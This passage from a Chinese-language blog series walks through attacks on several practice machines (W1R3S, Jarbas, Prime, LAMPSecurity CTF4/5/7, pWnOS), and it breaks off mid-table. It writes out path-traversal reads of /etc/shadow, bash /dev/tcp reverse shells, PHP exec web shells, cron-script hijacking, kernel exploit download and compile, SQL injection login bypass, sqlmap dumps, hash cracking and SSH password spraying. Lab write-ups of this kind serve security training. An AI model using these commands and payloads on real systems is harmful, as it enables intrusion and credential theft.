目录扫描</h2><p>换<code>dirsearch</code>扫一下，<code>kali</code>的<code>dirb</code>没有高亮，不习惯，<code>python ./dirsearch.py -u 192.168.32.130</code></p><p><code>http://192.168.32.130/administrator/installation/</code>得知这是一个<code>Cuppa CMS</code>，这里的操作页面是没有什么用的，找一下<code>CMS</code>的漏洞</p><h2 id="web渗透-2"><a class="markdownIt-Anchor" href="#web渗透-2"></a> web渗透</h2><p><code>searchsploit cuppa</code>，告诉我们<code>/alertConfigField.php</code>存在<strong>本地/远程文件包含</strong><br />获取说明<code>searchsploit cuppa -m 25971.txt</code></p><p>这里需要修改一下路径<code>http://192.168.32.130/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</code></p><p>但页面并没有回显，换成<code>POST请求</code>或者<code>curl</code><br /><code>curl -X POST -d &quot;urlConfig=../../../../../../../../../etc/passwd&quot; http://192.168.32.130/administrator/alerts/alertConfigField.php</code><br />读一下影子文件<code>/etc/shadow</code>，因为<code>passwd</code>里面的密码只能显示<code>x</code><br />拿到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root:$6$vYcecPCy$JNbK.hr7HU72ifLxmjpIP9kTcx./ak2MM3lBs.Ouiu0mENav72TfQIs8h1jPm2rwRFqd87HDC0pi7gn9t7VgZ0:17554:0:99999:7:::</span><br><span class="line">www-data:$6$8JMxE7l0$yQ16jM..ZsFxpoGue8/0LBUnTas23zaOqg2Da47vmykGTANfutzM8MuFidtb0..Zk.TUKDoDAVRCoXiZAH.Ud1:17560:0:99999:7:::</span><br><span class="line">w1r3s:$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.:17567:0:99999:7:::</span><br></pre></td></tr></table></figure><p>这里就拿到了三个用户的密码哈希</p><h2 id="密码爆破"><a class="markdownIt-Anchor" href="#密码爆破"></a> 密码爆破</h2><p>拿<strong>john</strong>爆一下<br /><img src="https://picx.zhimg.com/80/v2-6bfd16e3f6ad3646ca21319b27dbf523_1440w.png" alt="" /><br />有密码就直接提权了</p><h2 id="总结-2"><a class="markdownIt-Anchor" href="#总结-2"></a> 总结</h2><p>本靶机找到<code>cuppa</code>的漏洞即可，要注意这些不怎么明显的信息</p><h1 id="jarbas"><a class="markdownIt-Anchor" href="#jarbas"></a> jarbas</h1><h2 id="主机发现与端口扫描"><a class="markdownIt-Anchor" href="#主机发现与端口扫描"></a> 主机发现与端口扫描</h2><p>这是个<code>centos7</code>的靶机<br /><code>nmap -sn 192.168.32.0/24</code><br />发现主机<code>192.168.32.131</code><br /><code>nmap --min-rate 10000 -p- 102.168.32.131</code><br />发现开放了<code>22 80 3306</code><br /><code>TCP UDP</code>扫，<code>nmap</code>自带脚本扫，没有得到有用信息</p><h2 id="目录扫描-3"><a class="markdownIt-Anchor" href="#目录扫描-3"></a> 目录扫描</h2><p><code>dirb http://192.168.32.131</code>，诶，没扫到东西出来，指定后缀<br /><code>dirb http://192.168.32.131 -X .php,.html</code>，扫出一个<code>access.html</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tiago:5978a63b4654c73c60fa24f836386d87</span><br><span class="line">trindade:f463f63616cb3f1e81ce46b39f882fd5</span><br><span class="line">eder:9b38e2b1e8b12f426b0d208a7ab6cb98</span><br></pre></td></tr></table></figure><p><a href="https://hashes.com/en/decrypt/hash">多行哈希解密</a><br /><code>italia99 vipsu marianna</code></p><h2 id="web渗透-3"><a class="markdownIt-Anchor" href="#web渗透-3"></a> web渗透</h2><p>重启了靶机才扫出<code>8080端口</code>，我就说登陆界面怎么不见了。。。<br />账密对不上，得试试排列组合<code>eder vipsu</code><br />登进去后，随便点击创建项目，居然发现了这个<br /><img src="https://picx.zhimg.com/80/v2-ac6ce63ef84ebf1e3083feeca7f59d12_1440w.png" alt="" /><br /><code>bash -i &gt;&amp; /dev/tcp/192.168.32.128/2333 0&gt;&amp;1</code>写入保存然后点击立即构建，本地开监听<br /><code>whoami</code>得知当前用户为<code>jenkins</code>，读<code>/etc/passwd</code>只有<code>root ede</code>r有<code>/bin/bash</code>环境，但读取不到<code>/etc/shadow</code><br />接下来继续找找有没有<strong>定时任务</strong>可以利用</p><h2 id="定时任务提权-2"><a class="markdownIt-Anchor" href="#定时任务提权-2"></a> 定时任务提权</h2><p>查看系统定时任务<code>cat /etc/crontab</code><br /><img src="https://picx.zhimg.com/80/v2-e75274d832efe214ad63a2888cfe88f9_1440w.png" alt="" /><br />发现<strong>root权限</strong>运行的定时任务，该<code>sh脚本</code>是用来删日志文件的<br />看一下权限是<strong>777</strong>，那我们直接追加写入<code>反弹shell</code>语句就好了<br /><code>echo 'bash -i &gt;&amp; /dev/tcp/192.168.32.128/233 0&gt;&amp;1' &gt;&gt; /etc/script/CleaningScript.sh</code><br /><code>kali</code>监听<code>233端口</code><br />这里是<strong>五分钟</strong>执行一次定时任务，等一等就好了</p><h2 id="总结-3"><a class="markdownIt-Anchor" href="#总结-3"></a> 总结</h2><p>还是<strong>定时任务提权</strong>，主要原因是因为该执行脚本权限给的太高了</p><h1 id="primes"><a class="markdownIt-Anchor" href="#primes"></a> primes</h1><p>哦豁，这是一台用于<code>OSCP考试</code>的靶机</p><h2 id="主机发现与端口扫描-2"><a class="markdownIt-Anchor" href="#主机发现与端口扫描-2"></a> 主机发现与端口扫描</h2><p><code>nmap -sn 192.168.32.0/24</code><br /><code>nmap --min-rate 10000 -p- 192.168.32.132</code><br />这次只发现了22和80端口<br /><code>TCP UDP</code>自带的<code>vuln扫描脚本</code>扫一遍都没发现什么东西，知道了是<code>wordpress cms</code></p><h2 id="目录扫描-4"><a class="markdownIt-Anchor" href="#目录扫描-4"></a> 目录扫描</h2><p><code>dirb http://192.168.32.132</code><br />扫出了<code>/dev</code> <code>/wordpress/wp-admin</code>等一堆路径，依然是需要登陆，但<code>/dev</code>告诉了我们要深挖，因此先不要爆破密码了(试了一手弱口令没成功)</p><p>继续扫<br /><code>dirb http://192.168.32.132 -X .zip,.txt,.php</code><br /><code>/image.php</code> <code>/index.php</code> <code>/secret.txt</code></p><p><code>/secret.txt</code>告诉我们需要在<code>php</code>页面上做更多<code>fuzz</code>，找到<strong>正确的参数</strong>，还给了工具链接<code>wfuzz</code>，<code>kali</code>自带有，并且给了下一步的提示<code>location.txt</code></p><h2 id="web渗透-4"><a class="markdownIt-Anchor" href="#web渗透-4"></a> web渗透</h2><p><code>wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt --hh 136 ``http://192.168.32.132/index.php?FUZZ=</code></p><p>得到<code>file</code>参数，结合提示访问<code>/index.php?file=location.txt</code><br />给了<code>/image.php</code>页面的参数<code>secrettier360</code></p><p>发现能<strong>任意文件读取</strong>而且读不到的<strong>不会返回任何信息</strong></p><p>找到三个有<code>/bin/bash</code>环境的用户<code>root victor guest-w3z5e1</code></p><p><code>shadow</code>文件读不到<br />还放了一句<code>saket:x:1001:1001:find password.txt file in my directory:/home/saket:</code></p><p>读<code>/home/saket/password.txt</code>得到<code>follow_the_ippsec</code><br /><code>ssh</code>试过一遍，不对，那就登陆<code>wordpress</code>，发现也不是</p><p>再访问<code>/wordpress</code>看看，发现博客作者是<code>victor</code>，试一下是不是他的密码<br /><code>/wordpress/wp-login.php</code><br />成功进入后台</p><p>找到一个留给我们的可以执行<code>php代码</code>的文件<code>http://192.168.32.132/wordpress/wp-admin/theme-editor.php?file=secret.php&amp;theme=twentynineteen</code></p><p>其他位置都<strong>不可写</strong><br />写入<code>shell</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.32.128/2333 0&gt;&amp;1&#x27;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>保存后需要访问该文件的路径才能建立连接</p><p>小查一手<br /><code>http://192.168.32.132/wordpress/wp-content/themes/twentynineteen/secret.php</code></p><p>查看当前权限<code>sudo -l</code></p><p><code>/home/saket/enc</code>发现无权限<br />定时任务这边，在<code>/root/t.sh</code>这样就没有办法下手了</p><h2 id="内核漏洞提权"><a class="markdownIt-Anchor" href="#内核漏洞提权"></a> 内核漏洞提权</h2><p><code>uname -a</code>看到<code>Linux</code>版本很低<code>Linux ubuntu 4.10.0-28-generic #32~16.04.2-Ubuntu</code></p><p><code>searchsploit Linux ubuntu 4.10.0-28</code><br /><img src="https://picx.zhimg.com/80/v2-e9c08ae405ec638d38b3ba00478c4043_1440w.png" alt="" /><br />这里有一个<strong>提权漏洞</strong><br /><code>searchsploit -m 45010.c</code></p><p>查看使用方法，发现需要<code>gcc编译</code>，那么我们让靶机<code>wget</code>下载下来即可<br /><code>kali</code>开<code>web服务</code>，<code>php -S 0:80</code></p><p>靶机在<code>/tmp</code>目录下(这里有权限)执行，<code>wget http://192.168.32.128/45010.c</code><br /><code>gcc</code>编译，<code>gcc 45010.c -o getshell</code>，执行然后提权<code>./getshell</code></p><p><code>dpkg -l | grep &quot;python&quot;</code><br /><code>python -c &quot;import pty;pty.spawn('/bin/bash')&quot;</code><br /><code>cat /root/root.txt</code></p><h2 id="openssl解密"><a class="markdownIt-Anchor" href="#openssl解密"></a> OpenSSL解密</h2><p>思路二：</p><p>这里从拿到<code>www-data</code>权限开始，<code>python -c &quot;import pty;pty.spawn('/bin/bash')&quot;</code> <code>sudo -l</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User www-data may run the following commands on ubuntu:</span><br><span class="line">    (root) NOPASSWD: /home/saket/enc</span><br></pre></td></tr></table></figure><p>说明当前用户能够以无密码<code>root</code>权限运行<code>enc</code>，但是还是需要密码，找找看<br />而且密码这种东西可能存在<strong>备份</strong>，<code>find / -name &quot;*backup*&quot; 2&gt;dev/null</code></p><p><code>/var/backups</code>的<code>passwd.bak</code> <code>shadow.bak</code>没有权限</p><p><code>cat /opt/backup/server_database/backup_pass</code>得到<code>backup_password</code></p><p><code>./enc</code>告诉我good。。。<br />但是多了两个东西</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/bin/cp: cannot stat &#x27;/root/enc.txt&#x27;: Permission denied</span><br><span class="line">/bin/cp: cannot stat &#x27;/root/key.txt&#x27;: Permission denied</span><br></pre></td></tr></table></figure><p>奥，命令不对<br /><code>sudo ./enc</code><br />但是这也让我提前注意到了这两个文件，就在<code>/home/saket</code>目录下面</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">I know you are the fan of ippsec.</span><br><span class="line"></span><br><span class="line">So convert string &quot;ippsec&quot; into md5 hash and use it to gain yourself in your real form.</span><br></pre></td></tr></table></figure><p>将<code>ippsec</code>进行<code>MD5加密</code>并以<code>16进制</code>输出<br /><code>echo -n 'ippsec' | md5sum | awk -F ' ' '&#123;print $1;&#125;' | tr -d '\n' | od -A n -t x1| tr -d '\n' | tr -d ' '</code></p><p><code>openssl -h</code>，把<code>enc</code>的算法写入到<code>CipherTypeRaw</code><br /><code>vim CipherTypeRaw</code></p><p>换行分割解密算法，<code>awk '&#123;gsub(&quot; &quot;,&quot;\n&quot;);print&#125;' CipherTypeRaw | sort | uniq &gt; CipherTypes</code></p><p>解密算法遍历输出，<code>for cipher in $(cat CipherTypes); do echo &quot;nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=&quot; | openssl enc -d -a -$cipher -K 3336366137346362336339353964653137643631646233303539316333396431 2&gt;/dev/null;echo $cipher;done</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Dont worry saket one day we will reach to</span><br><span class="line">our destination very soon. And if you forget </span><br><span class="line">your username then use your old password</span><br><span class="line">==&gt; &quot;tribute_to_ippsec&quot;</span><br><span class="line"></span><br><span class="line">Victor,aes-256-ecb</span><br></pre></td></tr></table></figure><p>得到<code>saket/tribute_to_ippsec</code>，<code>ssh saket@192.168.32.132</code> <code>sudo -l</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User saket may run the following commands on ubuntu:</span><br><span class="line">    (root) NOPASSWD: /home/victor/undefeated_victor</span><br></pre></td></tr></table></figure><p><code>sudo /bin/bash</code>得到<br /><code>Sorry, user saket is not allowed to execute '/bin/bash' as root on ubuntu.</code></p><p>尝试<code>sudo /home/victor/undefeated_victor</code>，得到<code>if you can defeat me then challenge me in front of you /home/victor/undefeated_victor: 2: /home/victor/undefeated_victor: /tmp/challenge: not found</code></p><p>给<code>/tmp/challenge</code>赋予<code>/bin/bash</code>的可执行环境，即可<code>root</code>权限执行，成功<code>root</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;#!/bin/bash&#x27; &gt; /tmp/challenge</span><br><span class="line">echo &#x27;/bin/bash&#x27; &gt;&gt; /tmp/challenge</span><br><span class="line">chmod +x /tmp/challenge</span><br><span class="line">sudo /home/victor/undefeated_victor</span><br><span class="line">cat /root/root.txt</span><br></pre></td></tr></table></figure><h2 id="总结-4"><a class="markdownIt-Anchor" href="#总结-4"></a> 总结</h2><p>感觉低版本内核漏洞还是太少见了，不过<code>OpenSSL</code>解密也是一种新奇的思路</p><h1 id="lampsecurity-ctf4"><a class="markdownIt-Anchor" href="#lampsecurity-ctf4"></a> LAMPSecurity: CTF4</h1><h2 id="主机发现与端口扫描-3"><a class="markdownIt-Anchor" href="#主机发现与端口扫描-3"></a> 主机发现与端口扫描</h2><p><code>192.168.32.133</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT    STATE  SERVICE</span><br><span class="line">22/tcp  open   ssh</span><br><span class="line">25/tcp  open   smtp</span><br><span class="line">80/tcp  open   http</span><br><span class="line">631/tcp closed ipp</span><br></pre></td></tr></table></figure><p><code>TCP UDP</code>扫都没什么东西<br /><code>nmap</code>自带漏洞脚本，扫出了<code>CSRF、SQL</code>注入漏洞</p><h2 id="web渗透-5"><a class="markdownIt-Anchor" href="#web渗透-5"></a> web渗透</h2><p>看了一些登陆页面和<code>/robots.txt</code>的路径，小爆了账密一下，没有用，<code>/mail</code>，<code>SquirreMail1.4.17</code>，存在<strong>远程代码执行漏洞</strong>，但找不到有用的相关参考，然后博客文章，试了一下，发现用的是<code>mysql</code><br /><code>http://192.168.32.133/index.html?page=blog&amp;title=Blog&amp;id=5</code></p><p><code>sqlmap</code>直接<strong>爆数据库</strong><br /><code>sqlmap -u 'http://192.168.32.133/index.html?page=blog&amp;title=Blog&amp;id=5' --dbs --dump --batch</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Database: ehks                                                                                                 </span><br><span class="line">Table: user</span><br><span class="line">[6 entries]</span><br><span class="line">+---------+-----------+--------------------------------------------------+</span><br><span class="line">| user_id | user_name | user_pass                                        |</span><br><span class="line">+---------+-----------+--------------------------------------------------+</span><br><span class="line">| 1       | dstevens  | 02e823a15a392b5aa4ff4ccb9060fa68 (ilike2surf)    |</span><br><span class="line">| 2       | achen     | b46265f1e7faa3beab09db5c28739380 (seventysixers) |</span><br><span class="line">| 3       | pmoore    | 8f4743c04ed8e5f39166a81f26319bb5 (Homesite)      |</span><br><span class="line">| 4       | jdurbin   | 7c7bc9f465d86b8164686ebb5151a717 (Sue1978)       |</span><br><span class="line">| 5       | sorzek    | 64d1f88b9b276aece4b0edcc25b7a434 (pacman)        |</span><br><span class="line">| 6       | ghighland | 9f3eb3087298ff21843cc4e013cf355f (undone1)       |</span><br><span class="line">+---------+-----------+--------------------------------------------------+</span><br></pre></td></tr></table></figure><p>尝试<code>ssh</code>登陆，<code>Kali</code>这边有问题，<code>windows</code>这边成功了<br /><code>ssh -oKexAlgorithms=diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 -oHostKeyAlgorithms=ssh-rsa,ssh-dss dstevens@192.168.32.133 -o macs=hmac-sha1-96</code></p><p>有密码，<code>sudo su</code>或者<code>sudo /bin/bash</code>，新启动一个新的<code>bash</code>线程命令，成功<code>root</code>，后续发现只有数据库里面的前两个用户可以<code>root</code></p><h2 id="总结-5"><a class="markdownIt-Anchor" href="#总结-5"></a> 总结</h2><p>成脚本小子了()</p><h1 id="lampsecurity-ctf5"><a class="markdownIt-Anchor" href="#lampsecurity-ctf5"></a> LAMPSecurity: CTF5</h1><h2 id="主机发现与端口扫描-4"><a class="markdownIt-Anchor" href="#主机发现与端口扫描-4"></a> 主机发现与端口扫描</h2><p><code>192.168.32.134</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT      STATE SERVICE</span><br><span class="line">22/tcp    open  ssh</span><br><span class="line">25/tcp    open  smtp</span><br><span class="line">80/tcp    open  http</span><br><span class="line">110/tcp   open  pop3</span><br><span class="line">111/tcp   open  rpcbind</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">143/tcp   open  imap</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">901/tcp   open  samba-swat</span><br><span class="line">3306/tcp  open  mysql</span><br><span class="line">54651/tcp open  unknown</span><br></pre></td></tr></table></figure><p>用<code>nmap</code>自带的漏洞脚本扫一下，嘶，跟上个靶机的情况一样</p><h2 id="web渗透-6"><a class="markdownIt-Anchor" href="#web渗透-6"></a> web渗透</h2><p>访问<code>web服务</code>，发现<code>Blo</code>g登陆里面的<code>NanoCM</code>S，小爆一手<code>admin</code>，没有<br />既然是<code>cms</code>，那找找洞<code>searchsploit nanocms</code></p><p><code>NanoCMS v0.4 - Remote Code Execution (RCE) (Authenticated)</code><br />远程代码执行，但需要登陆认证</p><p>继续搜索(<code>nanocms exploit</code>，搜漏洞的话，全是这个靶场的<code>wp</code>)，找到了<code>NanoCMS '/data/pagesdata.txt' Password Hash Information Disclosure Vulnerability</code></p><p><code>s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:32:&quot;9d2f75377ac0ab991d40c91fd27e52fd&quot;;</code><br /><a href="https://www.somd5.com/">somd5</a>查一手，得到<code>shannon</code></p><h2 id="提权"><a class="markdownIt-Anchor" href="#提权"></a> 提权</h2><p>随便找个可以编辑代码的地方，插进去(因为这里就是个<code>php</code>文件)<br /><code>&lt;?php exec(&quot;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.32.128/2333 0&gt;&amp;1'&quot;); ?&gt;</code><br />然后访问</p><p><code>cat /etc/passwd</code>，看见了很多有<code>/bin/bash</code>环境的用户，但没有密码，也看不了<code>shadow</code>文件</p><p>注意隐藏目录<code>ls -al</code>，<code>/home</code>目录下，<code>patrick</code>目录发现了tomboy桌面笔记软件，看看历史<code>.tomboy.log</code><br /><code>12/5/2012 7:25:03 AM [DEBUG]: Saving 'Root password'...</code></p><p>或者直接搜<code>pass字符串</code>(这也是个找关键字符串的好东西啊)，<code>grep -R -i pass /home/* 2&gt;/dev/null</code></p><p><code>cat /home/patrick/.tomboy/481bca0d-7206-45dd-a459-a72ea1131329.note</code><br />得到<code>50$cent</code><br />可交互<code>shell</code>，<code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code><br />切换<code>root</code>用户，<code>su root</code></p><h2 id="总结-6"><a class="markdownIt-Anchor" href="#总结-6"></a> 总结</h2><p>多翻翻用户的日志？看用户整了点什么操作</p><h1 id="lampsecurity-ctf7"><a class="markdownIt-Anchor" href="#lampsecurity-ctf7"></a> LAMPSecurity: CTF7</h1><h2 id="主机发现与端口扫描-5"><a class="markdownIt-Anchor" href="#主机发现与端口扫描-5"></a> 主机发现与端口扫描</h2><p>emmm，重启了好几次都扫不到，<a href="https://blog.csdn.net/sinat_35845281/article/details/126067936">参考修改配置文件</a></p><p>后面才发现原来打开靶机的时候要选择<code>我已移动该虚拟机</code></p><p><code>192.168.32.135</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT      STATE  SERVICE</span><br><span class="line">22/tcp    open   ssh</span><br><span class="line">80/tcp    open   http</span><br><span class="line">137/tcp   closed netbios-ns</span><br><span class="line">138/tcp   closed netbios-dgm</span><br><span class="line">139/tcp   open   netbios-ssn</span><br><span class="line">901/tcp   open   samba-swat</span><br><span class="line">5900/tcp  closed vnc</span><br><span class="line">8080/tcp  open   http-proxy</span><br><span class="line">10000/tcp open   snet-sensor-mgmt</span><br></pre></td></tr></table></figure><p>都扫了一遍，没什么东西</p><h2 id="web渗透-7"><a class="markdownIt-Anchor" href="#web渗透-7"></a> web渗透</h2><p><strong>80端口</strong>这边，貌似只有注册用户，连登陆界面都没有看见，<strong>SQL注入</strong>也试了一下，不行</p><p><strong>8080端口</strong>上来就是登陆，然后抓包想爆一下，发现了这东西<br /><img src="https://pica.zhimg.com/80/v2-8724623d7c79244129100f1003ae1196_1440w.png" alt="" /><br /><code>&lt;!--select * from users where username='admin' AND password=md5('admin123') and is_admin=1--&gt;</code><br />这里就很舒服了，直接<strong>单引号闭合</strong>，<strong>万能密码登陆</strong>，<code>' or 1=1 #</code>，密码随便</p><p><code>http://192.168.32.135:8080/readings.php</code>，找个编辑框写入<strong>反弹shell</strong>，<code>&lt;?php exec(&quot;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.32.128/2333 0&gt;&amp;1'&quot;); ?&gt;</code></p><p><code>There was a problem uploading to /var/www/html/assets/</code><br />发现他们下载的文件都在<code>/var/www/html/assets/</code>，但我们代码是无法被执行的</p><p>并且这个目录下的内容是可访问的，我们可以直接把<strong>反弹shell</strong>语句写入到文件，然后上传（其他两个位置是无法上传文件的）</p><p><code>http://192.168.32.135/assets/</code>访问该文件即可</p><h2 id="提权-2"><a class="markdownIt-Anchor" href="#提权-2"></a> 提权</h2><p><code>python -c &quot;import pty;pty.spawn('/bin/bash')&quot;</code>获取<strong>交互shell</strong></p><p><code>sudo -l</code> 查看权限，没密码<br /><code>cat /etc/passwd</code><br /><code>cat /etc/shadow</code>，没权限</p><p>回到<code>web目录</code>，回退，<code>/var/www/admin</code>，然后在<code>/var/www/admin/inc/db.php</code>发现<strong>数据库密码为空</strong><br /><code>mysql -u root -p</code><br />直接就登进来了</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> databases;</span><br><span class="line">use website;</span><br><span class="line"><span class="keyword">show</span> tables;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users;</span><br></pre></td></tr></table></figure><p>复制账号密码，然后保存利用命令行导出密码哈希<br /><code>cat up | awk -F ' ' &#123;'print $4'&#125; &gt; password.txt</code></p><p>先解压<strong>rockyou字典</strong>，<code>sudo gzip -d /usr/share/wordlists/rockyou.txt.gz</code></p><p><code>hashcat -a 0 -m 0 password.txt /usr/share/wordlists/rockyou.txt</code><br />以前想用<code>hashcat</code>爆，发现都是没内存？然后这次<a href="https://www.cnblogs.com/micr067/p/16494384.html">参考</a>修改，换成单核(1*4，之前2*2)，内存拉到4g(以前2g)</p><p>把爆破结果复制保存，然后继续分割<br /><code>cat pass.txt | awk -F ':' &#123;'print $2'&#125; &gt; password</code><br />用户名也搞一手<br /><code>cat up | awk -F ' ' &#123;'print $2'&#125; | awk -F '@' &#123;'print $1'&#125; &gt; username</code></p><h2 id="密码喷射脚本登陆ssh"><a class="markdownIt-Anchor" href="#密码喷射脚本登陆ssh"></a> 密码喷射脚本登陆ssh</h2><p><code>apt-get install crackmapexec</code></p><p><code>crackmapexec ssh 192.168.32.135 -u username -p password --continue-on-success</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">brian:my2cents</span><br><span class="line">alice:turtles77</span><br><span class="line">leon:qwer1234</span><br><span class="line">julia:madrid </span><br><span class="line">michael:somepassword</span><br><span class="line">charles:chuck33</span><br></pre></td></tr></table></figure><p><code>ssh -oKexAlgorithms=diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 -oHostKeyAlgorithms=ssh-rsa,ssh-dss brian@192.168.32.135 -o macs=hmac-sha1-96</code></p><p>有密码直接root就好了</p><h2 id="总结-7"><a class="markdownIt-Anchor" href="#总结-7"></a> 总结</h2><ul><li>数据库中肯定会记录一些关键信息，看看有没有办法获取</li><li>批量ssh登陆，<code>crackmapexec</code>是个好东西</li></ul><h1 id="pwnos20"><a class="markdownIt-Anchor" href="#pwnos20"></a> pWnOS2.0</h1><h2 id="主机发现与端口扫描-6"><a class="markdownIt-Anchor" href="#主机发现与端口扫描-6"></a> 主机发现与端口扫描</h2><p>需要先将<code>vmware</code>的子网设成<code>10.10.10.0</code><br /><code>nmap -sn 10.10.10.0/24</code><br />这个靶机<strong>固定ip</strong>为<code>10.10.10.100</code></p><p>只扫出了<code>22、80</code>端口，<code>vuln脚本</code>扫描可以发现是一个<strong>博客系统</strong></p><h2 id="目录扫描-5"><a class="markdownIt-Anchor" href="#目录扫描-5"></a> 目录扫描</h2><p>没什么关键信息，从<code>/blog</code>入手</p><h2 id="web渗透-8"><a class="markdownIt-Anchor" href="#web渗透-8"></a> web渗透</h2><p>开始一顿乱点，<strong>万能密码</strong>还能登陆，但没鸟用</p><p>但这里还可以<strong>sql注入</strong>，抓登陆包保存，然后</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r packet.txt --dbs </span><br><span class="line">sqlmap -r packet.txt -D ch16 --tables</span><br><span class="line">sqlmap -r packet.txt -D ch16 -T users --columns</span><br><span class="line">sqlmap -r packet.txt -D ch16 -T users -C first_name,last_name,pass --dump</span><br></pre></td></tr></table></figure><p>可惜<code>kali</code>这边没爆出来但是拿到了密码哈希，可以在线网站解，但后面发现根本没用</p><p><code>/blog/rss.php</code>，发现<code>SPHPBLOG 0.4.0</code>，<code>index.ph</code>p显示的是<code>Simple PHP Blog 0.4.0</code>，那就是一个<strong>博客cms</strong>喽，也可以用<code>whatweb</code>识别一下<code>whatweb http://10.10.10.100/blog/</code></p><p><code>searchsploit Simple PHP Blog 0.4.0</code><br /><code>searchsploit Simple PHP Blog 0.4.0 -m 1191.pl</code><br /><code>perl</code>脚本，安装依赖<code>apt install libswitch-perl</code></p><p><code>perl 1191.pl</code>看看怎么个用法<br /><code>perl 1191.pl -h http://10.10.10.100/blog -e 3 -U HvAng -P HvAng</code><br />1和2都没利用到，2的哈希一看就是<strong>加盐</strong>了，破解不了</p><p>登陆后，<code>new blog</code>可写入<strong>shell语句</strong>但貌似无法访问</p><p>找到一个上传图像的页面<code>/blog/upload_img.php</code>，<code>&lt;?php exec(&quot;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.10.128/2333 0&gt;&amp;1'&quot;);?&gt;</code><br />上传<code>shell.php</code>之后拿不到路径，那就大胆猜测一手<code>/blog/images</code></p><p>发现上面<code>1</code>的<code>cmd.php</code>也在这<code>http://10.10.10.100/blog/images/cmd.php?cmd=</code>，不过还是终端好用</p><h2 id="提权-3"><a class="markdownIt-Anchor" href="#提权-3"></a> 提权</h2><p><code>dpkg -l | grep python</code><br /><code>python -c &quot;import pty;pty.spawn('/bin/bash')&quot;</code><br />翻了一下<code>/etc/passwd</code> <code>/etc/shadow</code> <code>/etc/crontab</code>，找到了用户<code>Dan</code>有<code>/bin/bash</code>环境，然后继续找找数据库，找到<strong>数据库配置文件</strong><br /><code>cat /var/www/mysqli_connect.php</code><br /><code>mysql -u root -p</code>，密码<code>goodday</code>，居然不对<br />再找一下，<code>find / -name 'mysqli_connect.php' 2&gt;/dev/null</code>，得到<code>/var/mysqli_connect.php</code><br />密码为<code>root@ISIntS</code></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> databases;</span><br><span class="line">use ch16;</span><br><span class="line"><span class="keyword">show</span> tables;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users;</span><br></pre></td></tr></table></figure><p>得到<code>Dan</code>的<strong>密码哈希</strong><code>c2c4b4e51d9e23c02c15702c136c3e950ba9a4af</code>，在线网站得到<code>killerbeesareflying</code><br />丢，密码不对<br />尝试直接<code>root</code>，<code>ssh root@10.10.10.100</code>，密码<code>root@ISIntS</code>，阿西吧</p><h2 id="总结-8"><a class="markdownIt-Anchor" href="#总结-8"></a> 总结</h2><p>还是要注意<strong>数据库敏感信息</strong></p><h1 id="pwnos10"><a class="markdownIt-Anchor" href="#pwnos10"></a> pWnOS1.0</h1><h2 id="主机发现与端口扫描-7"><a class="markdownIt-Anchor" href="#主机发现与端口扫描-7"></a> 主机发现与端口扫描</h2><p>现在学聪明了，都选择<strong>我已移动虚拟机</strong><br /><code>192.168.32.128</code>，我的<code>kali</code>到129了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT      STATE SERVICE</span><br><span 